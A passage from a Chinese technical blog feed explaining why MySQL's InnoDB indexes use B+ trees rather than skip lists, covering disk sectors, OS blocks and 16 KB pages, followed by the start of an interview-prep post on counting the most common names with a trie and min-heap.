title="B+数和跳表的整体结构"></a>B+数和跳表的整体结构</h2><p>整体上，B+数和跳表 都是 链表+ 多级索引组合 的结构</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/1.png"></p><h4 id="什么是MySQL中的B-Tree"><a href="#什么是MySQL中的B-Tree" class="headerlink" title="什么是MySQL中的B+Tree"></a>什么是MySQL中的B+Tree</h4><p>MySQL中的B+Tree 原理</p><ul><li><p>B+Tree一般由多个页、多层级组成，在MySQL中每个页 16 KB。</p></li><li><p>主键索引的 B+ 树的叶子结点才是数据，非叶子结点（内节点）存放的是索引信息。</p></li><li><p>上下层的页通过单指针相连。</p></li><li><p>同一层级的相邻的数据页通过双指针相邻。</p></li><li><p>B+Tree的结构</p></li></ul><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/2.png"></p><h3 id="B-Tree的查询过程"><a href="#B-Tree的查询过程" class="headerlink" title="B+Tree的查询过程"></a>B+Tree的查询过程</h3><p>B+Tree是由多个页组成的多层级结构，每个页16kb，对于主键索引来说，最末级的叶子节点放行数据，</p><p>非叶子节点放的是索引信息(主键ID和页号),用于加速查询。</p><p>我们想要查询数据5，会从顶层页的record开始，record里包含了主键Id和页号(页地址),</p><p>顶层页 向左最小id是1，最右最小id是7，</p><p>那id&#x3D;5的数据如果存在，那必定在顶层页 左边箭头，于是顺着的record的页地址就到了<code>6号</code>数据页里，</p><p>再判断id&#x3D;5&gt;4，所以肯定在右边的数据页里，于是加载<code>105号</code>数据页。</p><p>在<code>105号数据页</code>里，虽然有多行数据，但也<strong>不是挨个遍历的</strong>，数据页内还有个<strong>页目录</strong>的信息，里边是有序的。</p><p>所以，数据页内可以通过<strong>二分查找</strong>的方式加速查询行数据，于是找到id&#x3D;5的数据行，完成查询。</p><p>从上面可以看出，B+Tree利用了<strong>空间换时间的</strong>方式，**将查询时间复杂度从O(n)优化为O(lg(n))**。</p><h3 id="B-Tree的优点和缺点"><a href="#B-Tree的优点和缺点" class="headerlink" title="B+Tree的优点和缺点"></a>B+Tree的优点和缺点</h3><ul><li><p>B+Tree是一种平衡树结构，它具有根节点、内部节点和叶子节点。</p></li><li><p>每个节点包含一定数量的键值对，键值对按键值大小有序排列。</p></li><li><p>内部节点只包含键，叶子节点同时包含键和指向数据的指针。</p></li></ul><p><strong>B+Tree的优点</strong></p><ul><li><p>范围查询效率高：B+Tree支持范围查询，因为在B+Tree中，相邻的叶子节点是有序的，所以在查找范围内的数据时非常高效。</p></li><li><p>事务支持：B+Tree是一种多版本并发控制（MVCC）友好的数据结构，适用于事务处理场景，能够保证事务的ACID属性。</p></li><li><p>数据持久性：B+Tree的叶子节点包含所有数据，这意味着数据非常容易持久化到磁盘上，支持高可靠性和数据恢复。</p></li></ul><p><strong>B+Tree的缺点</strong></p><ul><li><p><strong>插入和删除开销较高</strong>：由于B+Tree的平衡性质，插入和删除操作可能需要进行节点的分裂和合并，这会导致性能开销较大。</p></li><li><p>高度不稳定：B+Tree的高度通常比较大，<strong>可能需要多次磁盘I&#x2F;O才</strong>能访问叶子节点，对于某些特定查询可能效率不高。</p></li></ul><h2 id="跳表"><a href="#跳表" class="headerlink" title="跳表"></a>跳表</h2><h3 id="跳表的原理"><a href="#跳表的原理" class="headerlink" title="跳表的原理"></a>跳表的原理</h3><p>跳表是一种采用了用空间换时间思想的数据结构。</p><p>跳表会随机地将一些节点提升到更高的层次，以创建一种逐层的数据结构，以提高操作的速度。</p><h3 id="跳表的结构"><a href="#跳表的结构" class="headerlink" title="跳表的结构"></a>跳表的结构</h3><p>跳表的做法就是给链表做索引，而且是分层索引，</p><h3 id="单层跳表"><a href="#单层跳表" class="headerlink" title="单层跳表"></a>单层跳表</h3><p>单层跳表, 可以退化到一个链表</p><p>查找的时间复杂度是 O（N）</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/3.png"></p><h3 id="两层跳表"><a href="#两层跳表" class="headerlink" title="两层跳表"></a>两层跳表</h3><p>两层跳表 &#x3D; 原始链表 + 一层索引</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/4.png"></p><h3 id="两层跳表查询"><a href="#两层跳表查询" class="headerlink" title="两层跳表查询"></a>两层跳表查询</h3><p>如查询id&#x3D;11的数据，我们先在上层遍历，依次判断1,6,12，</p><p>很快就可以判断出11在6到12之间，</p><p>第二步，然后往下一跳，进入原始链表，就可以在遍历6,7,8,9,10,11之后，确定id&#x3D;11的位置。</p><p>通过第一级索引，直接将查询范围从原来的1到11，缩小到现在的1,6,7,8,9,10,11。</p><h3 id="三层跳表"><a href="#三层跳表" class="headerlink" title="三层跳表"></a>三层跳表</h3><p>三层跳表 &#x3D; 原始链表 + 第一层索引 + 第二层索引</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/5.png"></p><h3 id="三层跳表查询"><a href="#三层跳表查询" class="headerlink" title="三层跳表查询"></a>三层跳表查询</h3><p>如果还是查询id&#x3D;11的数据，就只需要查询1,6,9,10,11就能找到，比两层的时候更快一些。</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/6.png"></p><h3 id="跳表查找的时间复杂度"><a href="#跳表查找的时间复杂度" class="headerlink" title="跳表查找的时间复杂度"></a>跳表查找的时间复杂度</h3><p>在一个单链表中查询某个数据的时间复杂度是 O(n)。也就是说，单层的跳表， 时间复杂度是 O(n)。</p><p>跳表 就是 为链表 增加多级索引， 完成空间换时间， 实现 时间复杂度是 O(logn)。</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/7.png"><br>这个时间复杂度的分析方法比较难想到。</p><p>先问题分解一下，先来看这样一个问题，如果链表里有 n 个结点，会有多少级索引呢？</p><p>在跳表中，假设每两个结点，会抽出一个结点作为上一级索引的结点。</p><p>那么，索引有多少级，每一级有多少个node呢：</p><ul><li><p>第一级索引的结点个数大约就是 n&#x2F;2，</p></li><li><p>第二级索引的结点个数大约就是 n&#x2F;4，</p></li><li><p>第三级索引的结点个数大约就是 n&#x2F;8，</p></li></ul><p>依次类推，也就是说，</p><ul><li><p>第 k 级索引的结点个数是第 k-1 级索引的结点个数的 1&#x2F;2，</p></li><li><p>那第 k级索引结点的个数就是 n&#x2F;(2的k次方)。</p></li></ul><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/8.png"><br>假设索引有 h 级，最高级的索引有 2 个结点。</p><p>通过上面的公式，我们可以得到 n&#x2F;(2^h)&#x3D;2，从而求得 h&#x3D;log2n-1。</p><p>如果包含原始链表这一层，整个跳表的高度就是 log2n。</p><p>我们在跳表中查询某个数据的时候，如果每一层都要遍历 m 个结点，那在跳表中查询一个数据的时间复杂度就是 O(m*logn)。</p><p>那m到底是多少呢?</p><p>假设我们要查找的数据是 x，在第 k 级索引中，我们遍历到 y 结点之后，发现 x 大于 y，小于后面的结点 z，所以我们通过 y 的 down 指针，从第 k 级索引下降到第 k-1 级索引。</p><p>在第 k-1 级索引中，y 和 z 之间只有 3 个结点（包含 y 和 z），所以，我们在 K-1 级索引中最多只需要遍历 3 个结点，依次类推，每一级索引都最多只需要遍历 3 个结点。</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/9.png"><br>过上面的分析，我们得到 m&#x3D;3，</p><p>所以在跳表中查询任意数据的时间复杂度就是 O(logn)。</p><p>这个查找的时间复杂度跟二分查找是一样的，这也体现了空间换时间的效率之高。</p><h3 id="跳表-Skip-List-的优点和缺点"><a href="#跳表-Skip-List-的优点和缺点" class="headerlink" title="跳表(Skip List)的优点和缺点"></a>跳表(Skip List)的优点和缺点</h3><p>跳表是一种多层级的数据结构，每一层都是一个有序链表，</p><p>最底层包含所有数据，而上层包含的数据是下层的子集，通过跳跃节点快速定位目标数据。</p><p><strong>跳表(Skip List)的优点</strong></p><ul><li><p>平均<strong>查找时间较低</strong>：跳表的查询时间复杂度为O(log n)，与平衡树结构相似，但实现起来较为简单。</p></li><li><p>插入和删除操作相对较快：由于跳表不需要进行节点的频繁平衡调整，插入和删除操作的性能较好。</p></li></ul><p><strong>跳表(Skip List)的缺点</strong></p><ul><li><p>难以实现<strong>事务和数据持久性</strong>：跳表的更新操作可能涉及多个层级，实现事务和数据持久性要求更复杂。</p></li><li><p>空间开销较大：跳表需要额外的指针来连接不同层级，占用的内存空间较多。</p></li></ul><h2 id="B-Tree-和-跳表-Skip-List-的在数据结构上的区别"><a href="#B-Tree-和-跳表-Skip-List-的在数据结构上的区别" class="headerlink" title="B+Tree 和 跳表(Skip List) 的在数据结构上的区别"></a>B+Tree 和 跳表(Skip List) 的在数据结构上的区别</h2><p>都是 多级索引 +链表</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/10.png"></p><h3 id="IO-操作的单位-不同"><a href="#IO-操作的单位-不同" class="headerlink" title="IO 操作的单位 不同"></a>IO 操作的单位 不同</h3><p>B+Tree 是page （16K）</p><p>跳表(Skip List) 是 node 节点 ，一个node 几十个字节</p><h3 id="树的高度-不同"><a href="#树的高度-不同" class="headerlink" title="树的高度 不同"></a>树的高度 不同</h3><p><strong>B+树</strong>是多叉树结构，每个结点都是一个<code>16k</code>的数据页，能存放较多索引信息。</p><p>同样的数据，树的高度比较小。 三层B+左右就可以存储2kw左右的数据。</p><p>如果，把三层B+树塞满，那大概需要2kw左右的数据。 也就是说查询一次数据，如果这些数据页都在磁盘里，那么<strong>最多需要查询三次磁盘IO</strong>。</p><p>跳表是链表结构，一条数据一个结点，</p><p>如果最底层要存放2kw数据，且每次查询都要能达到二分查找的效果，2kw大概在2的24次方 左右，</p><p>所以，2kw数据的跳表大概高度在24层左右。 如果要一个节点要进行一次磁盘IO，大概要进行 24次。</p><h2 id="B-Tree-和-跳表-Skip-List-的新增数据区别"><a href="#B-Tree-和-跳表-Skip-List-的新增数据区别" class="headerlink" title="B+Tree 和 跳表(Skip List) 的新增数据区别"></a>B+Tree 和 跳表(Skip List) 的新增数据区别</h2><p>了解了二者的基本情况之后，接下来，对B+Tree 和 跳表(Skip List) 的数据插入进行对比。</p><p>B+Tree和跳表的叶子层，都包含了所有的数据，且叶子层都是顺序的，适合用于范围查询。</p><p>来看看，B+Tree和跳表新增和删除数据的差异</p><h3 id="B-Tree-新增数据"><a href="#B-Tree-新增数据" class="headerlink" title="B+Tree 新增数据"></a>B+Tree 新增数据</h3><p><strong>场景1： 叶子结点和索引结点都没满</strong></p><p>B+Tree 直接插入到叶子结点中就好了。</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/11.png"><br><strong>场景2：叶子结点满了，但索引结点没满</strong></p><p>B+Tree 需要拆分叶子结点，同时索引结点要增加新的索引信息。</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/12.png"><br><strong>场景3：叶子结点满了，且索引结点也满了</strong></p><p>叶子和索引结点都要拆分，同时往上还要再<strong>加一层索引。</strong></p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/13.png"><br>B+树是一种多叉平衡二叉树，要维护各个分支的高度差距，不能太大，平衡意味着子树们的高度层级尽量一致（一般最多差一个层级）。</p><p>为啥要平衡呢？平衡意味着在搜索的时候，不管走哪个子树分支，搜索次数都差不了太多。</p><p>所以，为了维持B+树的平衡，在插入新的数据时，B+树会不断将进行 <strong>数据页的 分裂</strong>。</p><h3 id="跳表新增数据"><a href="#跳表新增数据" class="headerlink" title="跳表新增数据"></a>跳表新增数据</h3><p>跳表同样也是很多层，新增一个数据时，最底层的链表需要插入数据，</p><p>然后，考虑是否需要在上面几层中加入数据做索引 ？ 这个就靠<strong>随机函数</strong>了。</p><p>例如: 如果跳表中插入数据id&#x3D;6，且随机函数返回第三层（有25%的概率），那就需要在跳表的最底层到第三层都插入数据。</p><p>跳表跟B+树不一样，跳表是否新增层数，纯粹靠随机函数，不太关心平衡的问题。</p><h2 id="B-Tree和跳表的在新增数据上的区别"><a href="#B-Tree和跳表的在新增数据上的区别" class="headerlink" title="B+Tree和跳表的在新增数据上的区别"></a>B+Tree和跳表的在新增数据上的区别</h2><h4 id="B-Tree-需要维护-树的平衡"><a href="#B-Tree-需要维护-树的平衡" class="headerlink" title="B+Tree 需要维护 树的平衡"></a>B+Tree 需要维护 树的平衡</h4><p>为了维持B+树的平衡，在插入新的数据时，B+树会不断将进行 <strong>数据页的 分裂</strong>。</p><p>维护平衡意味维护搜索的稳定性， 意味着着在搜索的时候，不管走哪个子树分支，搜索次数都差不了太多。</p><h4 id="跳表-需要不太关心平衡问题"><a href="#跳表-需要不太关心平衡问题" class="headerlink" title="跳表 需要不太关心平衡问题"></a>跳表 需要不太关心平衡问题</h4><p>跳表在新增数据 时，不太关心平衡的问题。跳表插入数据的时候，跟B+树不一样，是否新增层数，纯粹靠随机函数去决定。</p><h2 id="为什么B-Tree-采用Page作为-IO操作的单位？"><a href="#为什么B-Tree-采用Page作为-IO操作的单位？" class="headerlink" title="为什么B+Tree 采用Page作为 IO操作的单位？"></a>为什么B+Tree 采用Page作为 IO操作的单位？</h2><p>前面讲到，B+Tree和跳表 IO 操作的单位 不同</p><ul><li><p>B+Tree 是page （16K） ,粗粒度IO</p></li><li><p>跳表(Skip List) 是 node 节点 ，一个node 几十个字节 , 细粒度IO</p></li></ul><p>这是和 Mysql的存储介质有关系， Mysql的数据需要持久化存储， 并且需要事务机制保证持久性，所以，必须存储在磁盘上。</p><h3 id="内存和磁盘的访问速度对比"><a href="#内存和磁盘的访问速度对比" class="headerlink" title="内存和磁盘的访问速度对比"></a>内存和磁盘的访问速度对比</h3><p>机械硬盘的读写速度，大致如下</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/14.png"><br>固态硬盘的读写速度，大致如下</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/15.png"><br>内存的读写速度，和磁盘读写速度的对比</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/16.png"><br>为什么磁盘慢，和磁盘的结构有关。</p><h3 id="机械硬盘的扇区（sector）"><a href="#机械硬盘的扇区（sector）" class="headerlink" title="机械硬盘的扇区（sector）"></a>机械硬盘的扇区（sector）</h3><p>机械硬盘的性能为啥那么慢？ 看看结构就知道：</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/17.png"><br>机械磁盘上的每个磁道被等分为若干个弧段，这些弧段称之为扇区。</p><p>如何在磁盘中读&#x2F;写数据？ 需要 物理动作，去移动 “磁头” 到目标 扇区</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/18.png"><br>机械磁盘的读写以扇区为基本单位。</p><p>硬盘的物理读写以扇区为基本单位。通常情况下每个扇区的大小是 512 字节。linux 下可以使用 <code>fdisk -l</code> 了解扇区大小：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo /sbin/fdisk -l  </span><br><span class="line">Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors  </span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes  </span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes  </span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes  </span><br><span class="line">Disklabel type: dos  </span><br><span class="line">Disk identifier: 0x7d9f5643  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中 Sector size，就是扇区大小，本例中为 512 bytes。</p><p>注意，扇区是磁盘物理层面的概念，不是操作系统的概率。</p><p>操作系统是不直接与扇区交互的，而是与多个连续扇区组成的磁盘块交互。由于扇区是物理层面的概念，所以无法在系统中进行大小的更改。</p><h3 id="操作系统-IO-块-Block"><a href="#操作系统-IO-块-Block" class="headerlink" title="操作系统 IO 块 Block"></a>操作系统 IO 块 Block</h3><p>文件系统读写数据的最小单位，也叫磁盘簇，IO区块 BLOC。</p><p>什么是IO 块 Block？ 扇区是磁盘最小的物理存储单元，操作系统将相邻的扇区组合在一起，形成一个块，对块进行管理。</p><p>每个Block 磁盘块可以包括 2、4、8、16、32 或 64 个扇区。</p><p>所以，Block 磁盘块是操作系统所使用的逻辑概念，而非磁盘的物理概念。</p><p>Block 磁盘块的大小可以通过命令 <code>stat /boot</code> 来查看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo stat /boot  </span><br><span class="line">  File: /boot  </span><br><span class="line">  Size: 4096        Blocks: 8          IO Block: 4096   directory  </span><br><span class="line">Device: 801h/2049d  Inode: 655361      Links: 3  </span><br><span class="line">Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)  </span><br><span class="line">Access: 2019-07-06 20:19:45.487160301 +0800  </span><br><span class="line">Modify: 2019-07-06 20:19:44.835160301 +0800  </span><br><span class="line">Change: 2019-07-06 20:19:44.835160301 +0800  </span><br><span class="line"> Birth: -  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中 IO Block 就是磁盘块大小，本例中是 4096 Bytes，一般也是 4K。</p><h3 id="Mysql的InnoDB-Page-数据页"><a href="#Mysql的InnoDB-Page-数据页" class="headerlink" title="Mysql的InnoDB Page 数据页"></a>Mysql的InnoDB Page 数据页</h3><p>磁盘IO是低性能的，如何提升性能， 最好是 减少IO， 基于时间局部性和空间局部性原理， 一次读取足够多的数据到内存。</p><p>Mysql的 InnoDB将数据划分为若干页，以Page 页作为磁盘与内存交互的基本单位，一般页的大小为16KB。</p><p>InnoDB，为了通过减少内存与磁盘的交互次数，把一次读取和写入的 数据量， 从4K 扩大到了16K，也就是一次操作 4个 OS Block，从而提升性能。</p><p>这样的话，一次性至少读取1Page 页数据到内存中或者将1 Page页数据写入磁盘。而不是一个操作系统的block。</p><p>Page 本质上就是一种典型的缓存设计思想，一般缓存的设计基本都是从时间局部性和空间局部性进行考量的：</p><ul><li><p>时间局部性：如果一条数据正在在被使用，那么在接下来一段时间内大概率还会再被使用。可以认为热点数据缓存都属于这种思路的实现。</p></li><li><p>空间局部性：如果一条数据正在在被使用，那么存储在它附近的数据大概率也会很快被使用。InnoDB的数据页和操作系统的页缓存则是这种思路的体现。</p></li></ul><p>InnoDB Page 数据页的结构</p><p><img src="/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/19.png"><br>一开始生成页的时候，并没有User Records这个部分.</p><p>每当我们插⼊⼀条记录，都会从Free Space部分，也就是尚未使⽤的存储空间中申请⼀个记录⼤⼩的空间划分到User Records部分，当Free Space部分的空间全部被User Records部分替代掉之后，也就意味着这个页使⽤完了，如果还有新的记录插⼊的话，就需要去申请新的页了。</p><h3 id="一次IO一个page的优势"><a href="#一次IO一个page的优势" class="headerlink" title="一次IO一个page的优势"></a>一次IO一个page的优势</h3><p>MySQL的InnoDB存储引擎使用B+树而不是跳表，这是因为B+树一次IO一个page，大大节省了磁盘IO的操作。</p><p>如果使用跳表，那么一个node节点一次io， 存储的性能 估计要下降1000倍以上。</p><h2 id="总结：Mysql的索引为什么使用B-树而不使用跳表"><a href="#总结：Mysql的索引为什么使用B-树而不使用跳表" class="headerlink" title="总结：Mysql的索引为什么使用B+树而不使用跳表"></a>总结：Mysql的索引为什么使用B+树而不使用跳表</h2><h3 id="B-树更适合磁盘IO"><a href="#B-树更适合磁盘IO" class="headerlink" title="B+树更适合磁盘IO"></a>B+树更适合磁盘IO</h3><p><strong>B+Tree</strong>一个节点是一个page，是一种多叉树结构，每个结点都是一个16k的数据页，能存放较多索引信息。一次IO一个page，大大节省了磁盘IO的操作。</p><p><strong>B+Tree</strong>一个page 能存放较多索引信息 ，所以树的层数比较低， <strong>三层</strong>左右就可以存储<code>2kw</code>左右的数据也就是说查询一次数据，如果这些数据页都在磁盘里，那么最多需要查询<strong>三次磁盘IO</strong>。</p><h3 id="原生跳表不适合磁盘IO"><a href="#原生跳表不适合磁盘IO" class="headerlink" title="原生跳表不适合磁盘IO"></a>原生跳表不适合磁盘IO</h3><p><strong>跳表</strong>是链表结构，一条数据一个结点，那么一个node节点一次磁盘io， 一个page 页规模的IO存储的性能 估计要下降1000倍以上。</p><p>原生跳表 一个node存放一个 索引信息 ，所以树的层数比较高</p><p>如果最底层要存放2kw数据，且每次查询都要能达到二分查找的效果，2kw大概在2的24次方 左右，</p><p>所以，2kw数据的跳表大概高度在24层左右。 如果要进行查找，大概要进行 24次磁盘IO。</p><blockquote><p>这里讲的是原生跳表， 如果经过各种改进，那个不在此文讨论范围。</p></blockquote><p>所以，虽然在理论上，跳表的时间复杂度和B+树相同 ，但是：</p><ul><li><p>B+树更适合 磁盘IO， 更合适MYSQL。</p></li><li><p>从反面来说， 跳表更适合内存IO， 更适合redis。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>统计全国重名最多的前100个</title>
      
      <link href="/2024/06/02/%E7%BB%9F%E8%AE%A1%E5%85%A8%E5%9B%BD%E9%87%8D%E5%90%8D%E6%9C%80%E5%A4%9A%E7%9A%84%E5%89%8D100%E4%B8%AA/"/>
      <url>/2024/06/02/%E7%BB%9F%E8%AE%A1%E5%85%A8%E5%9B%BD%E9%87%8D%E5%90%8D%E6%9C%80%E5%A4%9A%E7%9A%84%E5%89%8D100%E4%B8%AA/</url>
      
        <content type="html"><![CDATA[<h1 id="阿里面试：全国14亿个姓名，统计出重名最多的前100个"><a href="#阿里面试：全国14亿个姓名，统计出重名最多的前100个" class="headerlink" title="阿里面试：全国14亿个姓名，统计出重名最多的前100个"></a>阿里面试：全国14亿个姓名，统计出重名最多的前100个</h1><blockquote><p>全国14亿人的数据中，统计出重名人数最多的前100位姓名</p></blockquote><p>最近有小伙伴在面试阿里，遇到这个面试题。小伙伴没有系统的去梳理和总结，所以支支吾吾的说了几句，面试官不满意，面试挂了。</p><p><strong>TOP N面试题是常见的算法题。</strong></p><p>TOP N 统计的面试题，是一道非常常见的题目，大家一定要掌握好。</p><h2 id="1-问题描述"><a href="#1-问题描述" class="headerlink" title="1. 问题描述:"></a>1. 问题描述:</h2><p>我们需要从全国14亿人的数据中，统计出重名人数最多的前100位姓名</p><h2 id="2-问题分析"><a href="#2-问题分析" class="headerlink" title="2. 问题分析:"></a>2. 问题分析:</h2><p>我们的目标：是找到重名人数最多的前100个姓名,</p><p>这意味着需要两步：</p><ul><li><p>需要有一个高效的数据结构来统计每个名字出现的次数,</p></li><li><p>并快速找到出现次数最多的前100个名字.</p></li></ul><p>所以这个问题就转化成了下一个问题： 使用一种低成本、高性能的数据结构，来统计每个名字出现的次数。</p><h2 id="3-如何选择一种最低成本、最高性能的数据结构？"><a href="#3-如何选择一种最低成本、最高性能的数据结构？" class="headerlink" title="3. 如何选择一种最低成本、最高性能的数据结构？"></a>3. 如何选择一种最低成本、最高性能的数据结构？</h2><p>常规的数据结构，选型如下:</p><ul><li><strong>数组</strong>:</li></ul><p>如果姓名的字符集范围很大(支持所有的Unicode字符)，那么，需要极大且稀疏的数组,导致内存浪费严重,也不适合处理动态长度和多样性的字符串集合</p><ul><li><p><strong>链表</strong>:</p><p>链表的插入和查找的操作时间复杂度为O(N), 并且，在大规模数据下性能低下,也不适合快速查找的场景</p></li><li><p><strong>跳表</strong>:</p></li></ul><p>跳表的插入、删除和查找操作的平均事件复杂度都是O(logN)，</p><p>跳表式空间换时间的思想，主要是它需要额外的空间来维护多级索引，每个元素在最坏的情况下需要额外的存储空间，导致总的空间复杂度为O(N log N),</p><p>在频繁的插入和查询的场景中，效率不高。</p><p>来到我们现在这个场景，统计每个名字出现的次数时，不如哈希表在时间和空间的效率高效，哈希表的O(1)时间复杂度更适合大规模的数据频繁的插入和查询。</p><ul><li><strong>哈希表:</strong></li></ul><p>哈希表的插入和查找的时间复杂度都是O(1),</p><p>但是在极端的情况下，哈希冲突会导致时间复杂度退化到O(N)，</p><p>在空间效率中，哈希表需要额外的空间来维护键值对，来到这个场景，空间效率和哈希冲突都有潜在风险，</p><p>最重要的是哈希表不能共享前缀，在处理大量的具有共同前缀的数据时候，也不适合。</p><ul><li><strong>平衡二叉搜索树(如AVL树或红黑树)</strong>:</li></ul><p>能够维护有序数据,支持快速的插入、删除和查找操作,但在字符串的比较上,性能不如哈希表和Trie高效</p><ul><li><strong>前缀树</strong>:</li></ul><p>前缀树通过共享前缀节点,节省了大量存储空间, 实现了成本的最低化</p><p>前缀树对于字符串操作非常高效, 在这个问题中, 有很多名字共享相同前缀, Trie的结构能有效利用这一特点。</p><p>经过上面的分析,能够看到Trie更适合统计每个名字出现的次数</p><h2 id="4-如何快速筛选出Top-100？"><a href="#4-如何快速筛选出Top-100？" class="headerlink" title="4. 如何快速筛选出Top 100？"></a>4. 如何快速筛选出Top 100？</h2><p>当知道了所有姓名出现的次数之后,、怎么样快速筛选出其中出现次数最多的前100个?</p><p>首先想到的是直接排序。</p><p>这个问题中,对14亿数据直接排序会有效率的问题，操作非常耗时。</p><p>所以直接排序， 这种方法不可取。</p><p>我们的目标是找到次数最多的前100个,可以利用堆的性质来完成。</p><p>小顶堆总是保持堆顶为当前堆中最小的元素，这样可以确保当新的元素插入时，如果新元素大于堆顶元素，堆顶元素会被替换掉</p><p>使用小顶堆的步骤:</p><p>1.初始化一个小顶堆:设为100</p><p>2.遍历每个姓名及其出现的次数:</p><ul><li><p>如果堆的大小小于100，将当前姓名及其出现次数插入堆中。</p></li><li><p>如果当前姓名的出现次数大于堆顶元素的出现次数，则移除堆顶元素，并将当前姓名及其出现次数插入堆中。</p></li></ul><p>3.遍历完所有的姓名后,堆中即为重名人数最多的前100个姓名</p><p>所以解决这个问题使用了前缀树 + 小顶堆</p><h2 id="5-前缀树Trie树介绍"><a href="#5-前缀树Trie树介绍" class="headerlink" title="5. 前缀树Trie树介绍"></a>5. 前缀树Trie树介绍</h2><p>在计算机科学中，trie，又称前缀树或字典树，使用一些单词来构建Trie树,如下图所示:</p><p><img src="/./2024/06/02/%E7%BB%9F%E8%AE%A1%E5%85%A8%E5%9B%BD%E9%87%8D%E5%90%8D%E6%9C%80%E5%A4%9A%E7%9A%84%E5%89%8D100%E4%B8%AA/1.png"></p><p>从图片中可以看到一些有意思的特性:</p><ul><li><p>根节点没有数据</p></li><li><p>从根节点到某一个节点,将他们的路径进行连接就组成了对应的字符串</p></li></ul><p>定义:</p><blockquote><p>Trie树，又称为前缀树或字典树, 是一种用于高效存储和检索字符串集合的数据结构, 每个节点代表一个字符, 边表示从一个字符到另一个字符的路径, Trie树通过共享相同前缀的节点来节省存储空间</p></blockquote><p>Trie树是一种有序树，用于保存关联数组，其中的键通常是字符串。</p><p>与二叉查找树不同，Trie树 的 键不是直接保存在节点中，而是由节点在树中的位置决定。</p><p>一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。</p><p>一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。</p><p>trie中的键通常是字符串，但也可以是其它的结构。</p><p>trie的算法可以很容易地修改为处理其它结构的有序序列，比如一串数字或者形状的排列。</p><p>比如，bitwise 